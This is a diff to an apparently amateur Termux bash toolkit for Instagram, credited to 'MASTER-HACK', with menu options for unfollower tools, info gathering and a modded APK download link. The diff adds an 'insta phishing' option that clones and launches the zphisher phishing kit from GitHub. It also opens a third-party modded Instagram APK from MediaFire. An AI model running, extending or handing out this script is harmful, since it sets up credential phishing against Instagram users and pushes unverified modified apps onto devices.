@@ -12,12 +12,7 @@ pink='\033[1;35m'
 clear
 
 echo -e " $red     
-
-
-
-
                      Hi
-
                 Bro contact me if you have any
                  Doubts
 "
@@ -77,13 +72,10 @@ ig_sig="4f8732eb9ba7d1c8e8897a75d6474d4eb3f5279137431b2aafb71fafe2abe178"
 
 echo -e "
 $red
-
 █ █▄░█ █▀ ▀█▀ ▄▀█ ▄▄ █▀▀ █▀█ █░░ █░░ █▀█ █░█░█
 █ █░▀█ ▄█ ░█░ █▀█ ░░ █▀░ █▄█ █▄▄ █▄▄ █▄█ ▀▄▀▄▀
-
 "
 echo -e " scripted  By MASTER-HACK
-
                 recoded by MASTER-HACK "
 
 
@@ -657,8 +649,11 @@ printf " \033[1;33m[7] \033[1;34m                  Download the Profile Info\e[0
 printf " \033[1;33m[8] \033[1;34m                  Activate Unfollower\e[0m\n"
 printf " \033[1;33m[9] \033[1;34m                  instagram info gathering\e[0m\n"
 printf " \033[1;33m[10] \033[1;34m                 install instagram mod apk\e[0m\n"
-printf " \033[1;33m[0] \033[1;34m                  exit \e[0m\n"
+printf " \033[1;33m[11] \033[1;34m                  insta phishing \e[0m\n"
+printf " \033[1;33m[0] \033[1;34m                 exit \e[0m\n"
+
 printf "\n"
+
 
 read -p $' \e[1;31m[\e[0m\e[1;77m::\e[0m\e[1;31m]\e[0m\e[1;77m Choose your option: \e[0m' option
 
@@ -723,7 +718,6 @@ cd ..
 
 elif [[ $option -eq 10 ]]; then
 echo -e " install the instagram mod apk on media fire.com
-
 moded by sam bro modz
 the moder 
 apk name insta thunder_v10 by sam bro modz
@@ -734,25 +728,27 @@ termux-open-url https://www.mediafire.com/file/zh0847bvifpads2/InstaThunder_v10_
 sleep 10
 echo "  https://www.mediafire.com/file/zh0847bvifpads2/InstaThunder_v10_By_SamMods.apk/file"
 echo -e " 
-
 subscribe his channel "
 termux-open-url https://youtube.com/c/TROKSMODS
 
 
 
 echo -e "
-
 	ok bye .. run the script again if you needed 
-
 by master-hack"
 echo -e "
-
 	
 	"
+elif [[ $option -eq 11 ]]; then
+apt install git -y
+cd $home
+git clone https://github.com/htr-tech/zphisher
+cd zphisher
+./zphisher
+
 elif [[ $option -eq 0 ]]; then
 echo -e "
 by master-hack
-
 thank you fore running this script
  "
 exit
